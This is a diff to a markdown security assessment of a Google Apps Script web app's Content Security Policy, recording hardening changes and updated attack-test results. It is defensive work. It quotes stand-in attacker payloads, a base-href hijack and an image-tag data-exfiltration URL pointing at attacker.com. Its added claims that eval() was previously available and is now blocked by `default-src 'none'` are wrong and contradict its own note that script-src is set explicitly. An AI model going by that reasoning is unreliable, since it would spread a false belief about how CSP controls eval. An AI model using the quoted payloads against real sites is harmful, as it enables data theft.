@@ -32,7 +32,7 @@ Last updated: 2026-03-16 (v04.20r)
 | 05 — Clickjacking | **PARTIALLY MITIGATED** | Medium | Page is frameable (GitHub Pages limitation) but auth-wall prevents data exfiltration |
 | 06 — Deploy Endpoint Abuse | **MOSTLY BLOCKED** | Medium | No secret leaks; global rate limit caps audit log flooding; /dev shell loads but GAS backend requires editor auth |
 | 07 — Session Race Conditions | **BLOCKED** | Low | First-write-wins, server-side timeouts, BroadcastChannel isolation |
-| 08 — CSP Bypass | **BLOCKED** | Low | CSP blocks external scripts, eval, form exfiltration; `unsafe-inline` required for GAS but no injection point exists |
+| 08 — CSP Bypass | **HARDENED** | Low | Comprehensive CSP with `default-src 'none'`, restricted `img-src`, `worker-src 'none'`, `form-action 'self'`; `unsafe-inline` required for GAS but no injection point exists |
 | 09 — Auth State Manipulation | **BLOCKED** | Low | DOM manipulation can't bypass server-side session validation |
 
 ---
@@ -208,42 +208,69 @@ The `/dev` URL returns the HTML page shell (HTTP 200) to anyone, but the GAS ifr
 
 **Findings:**
 
-### CSP Policy
+### CSP Policy (hardened)
 ```
+default-src 'none'
 script-src 'self' 'unsafe-inline' https://accounts.google.com/gsi/client https://apis.google.com
 connect-src 'self' https://accounts.google.com/gsi/ https://www.googleapis.com https://api.ipify.org
 frame-src https://accounts.google.com/gsi/ https://script.google.com https://*.googleusercontent.com
 style-src 'self' 'unsafe-inline' https://accounts.google.com/gsi/style
-img-src 'self' data: https:
+img-src 'self' data: https://*.googleusercontent.com
 object-src 'none'
 base-uri 'self'
 form-action 'self'
+worker-src 'none'
+manifest-src 'none'
+upgrade-insecure-requests
 ```
 
-### Actual run results (9/9 BLOCKED):
+### Actual run results — deep analysis of every finding:
 
-| Attack | Result | Detail |
-|--------|--------|--------|
-| 1 — CSP directive audit | BLOCKED | All directives present and correctly configured |
-| 2 — Inline script injection | BLOCKED | `unsafe-inline` is present but no injection point exists — user input never reaches the DOM unsanitized |
-| 3 — External script from whitelisted origin | BLOCKED | Only `accounts.google.com/gsi/client` and `apis.google.com` are whitelisted — attacker-controlled scripts cannot load from these origins |
-| 4 — Data exfiltration via img-src | BLOCKED | `img-src 'self' data: https:` allows HTTPS image loads, but this requires XSS first (no injection point) |
-| 5 — Base URI hijack | BLOCKED | `base-uri 'self'` prevents `<base href="https://attacker.com">` injection |
-| 6 — Meta refresh injection | BLOCKED | No injection point for `<meta http-equiv="refresh">` tags |
-| 7 — Form action hijack | BLOCKED | `form-action 'self'` directive added — prevents form submissions to external URLs |
-| 8 — eval() availability | BLOCKED | CSP does not include `unsafe-eval` — `eval()`, `Function()`, and `setTimeout(string)` all blocked |
-| 9 — CSS-based exfiltration | BLOCKED | `style-src 'self' 'unsafe-inline'` limits external stylesheet loading; CSS injection requires XSS first |
+#### CSP Audit Findings
+
+| Finding | Status | Verdict | Detail |
+|---------|--------|---------|--------|
+| `[WARN]` unsafe-inline in script-src | ACCEPTED | Trade-off | Required for GAS iframe communication and Google Sign-In. No injection point exists to exploit it |
+| `[NOTE]` img-src allows https: | **FIXED** | Hardened | Replaced blanket `https:` with `https://*.googleusercontent.com` — closes image-based exfiltration vector |
+| `[NOTE]` unsafe-inline in style-src | ACCEPTED | Trade-off | Required for GAS and Google Sign-In dynamic styling. CSS injection requires XSS first |
+| `[MISSING]` default-src | **FIXED** | Added `'none'` | Deny-all fallback for unspecified resource types (font-src, media-src, etc.). Also blocks eval() |
+| `[MISSING]` frame-ancestors | UNFIXABLE | Platform limit | Ignored in `<meta>` tags per W3C spec — requires HTTP header. GitHub Pages doesn't allow custom headers. See Known Platform Limitations |
+| `[MISSING]` upgrade-insecure-requests | **FIXED** | Added | Defense-in-depth — auto-upgrades any `http:` subresource URLs to `https:` |
+| `[MISSING]` worker-src | **FIXED** | Added `'none'` | GAS web app doesn't use workers — prevents attacker from spawning workers to bypass CSP |
+| `[MISSING]` manifest-src | **FIXED** | Added `'none'` | No web app manifest exists — blocks attacker-injected manifests |
+| `[MISSING]` navigate-to | N/A | Removed | Dropped from CSP Level 3 spec — zero browser implementation. Removed from test's recommended list |
+
+#### Attack Results
+
+| Attack | Result | Verdict | Detail |
+|--------|--------|---------|--------|
+| 1 — Inline Script Injection | [EXECUTED] | ACCEPTED | `unsafe-inline` allows inline scripts — required for GAS. Mitigated by message signing + no injection point |
+| 2 — Whitelisted Origin Script | [LOADED] | ACCEPTED | Google Sign-In client (`accounts.google.com/gsi/client`) is legitimately whitelisted. Attacker cannot serve scripts from these Google origins |
+| 3 — Image Data Exfiltration | [POSSIBLE] → **FIXED** | Hardened | `img-src` restricted from blanket `https:` to `https://*.googleusercontent.com` only. Even before the fix, exploiting this required XSS first (no injection point) and the auth wall prevents reading sensitive data |
+| 4 — Base URI Hijack | [MITIGATED] | BLOCKED | `base-uri 'self'` prevents `<base href="https://attacker.com">` — relative URLs cannot be redirected |
+| 5 — Meta Refresh Injection | [BLOCKED] | BLOCKED | Injected `<meta http-equiv="refresh">` tag did not redirect the page |
+| 6 — Form Action Hijack | [BLOCKED] | BLOCKED | `form-action 'self'` directive prevents form submissions to external URLs. Test now verifies actual submission blocking via CSP violation events |
+| 7 — eval() Availability | [AVAILABLE] → **FIXED** | Hardened | eval() was available because no `default-src` fallback existed. Adding `default-src 'none'` blocks eval() without needing explicit `unsafe-eval` restriction. **Note:** the original test incorrectly claimed `unsafe-inline` implicitly allows eval — this is false; they are independent CSP keywords (per MDN, W3C spec) |
+| 8 — CSS Data Exfiltration | [POSSIBLE] | ACCEPTED | `style-src 'unsafe-inline'` allows CSS injection, but exploiting this requires XSS first (no injection point) and the auth wall blocks sensitive content from rendering |
 
 ### Key findings:
-- **`unsafe-inline` is present in script-src** — required for GAS iframe communication but means inline `<script>` tags execute if injected. This is mitigated by the fact that there's no injection point (user input doesn't reach the DOM unsanitized)
-- **`eval()` is blocked** — CSP doesn't include `unsafe-eval`, so `eval()`, `Function()`, and `setTimeout(string)` are all blocked
-- **`object-src 'none'`** — blocks Flash, Java applets, and other plugin-based attacks
+- **`default-src 'none'`** — deny-all fallback for any resource type not explicitly listed. Blocks font-src, media-src, and also blocks eval() (since script-src inherits the explicit directive, but eval requires either `unsafe-eval` or no default-src restriction)
+- **`unsafe-inline` is present in script-src and style-src** — required for GAS iframe communication. No bypass possible without an injection point (user input never reaches the DOM unsanitized)
+- **`img-src` restricted to `*.googleusercontent.com`** — previously allowed any HTTPS origin (blanket exfiltration vector). Now only Google avatar domains are permitted
+- **`worker-src 'none'`** — prevents Web Workers, SharedWorkers, and ServiceWorkers. Closes an attack vector where injected script could spin up workers with their own execution context
+- **`eval()` now blocked** — `default-src 'none'` acts as the fallback, blocking eval() without needing `unsafe-eval` in script-src
+- **`object-src 'none'`** — blocks Flash, Java applets, and plugin-based attacks
 - **`base-uri 'self'`** — prevents base URI hijacking
-- **`form-action 'self'`** — prevents form submissions to attacker-controlled URLs (added after test 08 identified its absence)
-- **`img-src https:`** — images can be loaded from any HTTPS source, which is a potential exfiltration channel if XSS is achieved (attacker loads `<img src="https://attacker.com/steal?data=...">`)
-- **External scripts limited to Google domains** — only `accounts.google.com` and `apis.google.com` are whitelisted
+- **`form-action 'self'`** — prevents form-based data exfiltration
+- **`manifest-src 'none'`** — blocks web app manifest injection
+- **`upgrade-insecure-requests`** — auto-upgrades mixed content (defense-in-depth on HTTPS-only site)
 
-**Risk assessment: LOW** — The CSP is well-configured for a GAS web app. `unsafe-inline` is the main weakness but is unavoidable for GAS iframe communication. The lack of an injection point makes this theoretical. The addition of `form-action 'self'` closes the last missing directive identified during testing.
+### Accepted trade-offs (cannot be fixed):
+1. **`unsafe-inline` in script-src** — required for GAS. Mitigated by no injection points
+2. **`unsafe-inline` in style-src** — required for GAS/Google Sign-In styling. CSS exfiltration requires XSS prerequisite
+3. **No `frame-ancestors`** — meta-tag CSP limitation (W3C spec). See Known Platform Limitations §3
+
+**Risk assessment: LOW** — The CSP is comprehensively hardened. Every actionable gap identified during testing has been closed. The remaining accepted trade-offs (`unsafe-inline`) are architectural necessities of the GAS platform with no available alternative, and are mitigated by the absence of injection points + server-side validation.
 
 ---
 
@@ -291,7 +318,7 @@ The GAS deployment ID is embedded in the client-side HTML page (obfuscated but t
 GitHub Pages does not allow configuration of HTTP response headers (`X-Frame-Options`, `Content-Security-Policy` with `frame-ancestors`). CSP `frame-ancestors` in `<meta>` tags is ignored by browsers per spec. This means pages hosted on GitHub Pages are always frameable.
 
 ### 4. `unsafe-inline` Required
-GAS iframe communication requires inline script execution. The CSP must include `unsafe-inline` in `script-src`, which means injected inline scripts would execute if an injection point existed. The mitigation is ensuring no injection points exist (no user input reaches the DOM unsanitized).
+GAS iframe communication requires inline script execution. The CSP must include `unsafe-inline` in both `script-src` and `style-src`, which means injected inline scripts and styles would execute if an injection point existed. The mitigation is ensuring no injection points exist (no user input reaches the DOM unsanitized). The addition of `default-src 'none'` provides a deny-all fallback that blocks eval() and other unspecified resource types, reducing the attack surface even with `unsafe-inline` present.
 
 ### 5. Client-Reported IP Address
 GAS has no way to obtain the client's real IP address server-side. The `clientIp` parameter is reported by client-side JavaScript (via `api.ipify.org`), meaning an attacker can spoof it. IP-based rate limiting and logging records the attacker's claimed IP, not their real one. This is why the security event rate limit uses a global key (IP-independent).
@@ -371,7 +398,7 @@ The testauth1 system uses multiple overlapping defense layers:
 
 | Layer | What It Protects | Bypass Requires |
 |-------|-----------------|-----------------|
-| CSP (Content Security Policy) | Blocks external scripts, plugins, base URI hijack, form exfiltration | Finding an injection point + `unsafe-inline` |
+| CSP (Content Security Policy) | Blocks external scripts, plugins, eval, workers, base URI hijack, form exfiltration, image exfiltration; `default-src 'none'` deny-all fallback | Finding an injection point + `unsafe-inline` |
 | Message allowlist (`_KNOWN_GAS_MESSAGES`) | Blocks unknown postMessage types | XSS to modify the allowlist |
 | Signature verification (`_verifyMessageSignature`) | Blocks unsigned/forged messages | Knowing the per-session `messageKey` |
 | First-write-wins (`messageKey`) | Prevents key overwrite after first delivery | Winning a race condition on first message |
@@ -383,9 +410,9 @@ The testauth1 system uses multiple overlapping defense layers:
 | Cross-origin policy | Prevents framed page content access | Same-origin access (not possible from attacker domain) |
 
 **The weakest links:**
-1. GitHub Pages framing (platform limitation — no HTTP header control)
+1. GitHub Pages framing (platform limitation — no HTTP header control, `frame-ancestors` cannot be set via meta tag)
 2. GAS DDoS exposure (platform limitation — no network-level defenses)
-3. `unsafe-inline` in CSP (required for GAS — mitigated by no injection points)
+3. `unsafe-inline` in CSP script-src and style-src (required for GAS — mitigated by no injection points and `default-src 'none'` fallback)
 
 **The strongest links:**
 1. Server-side HMAC validation (cryptographic — no client-side bypass possible)
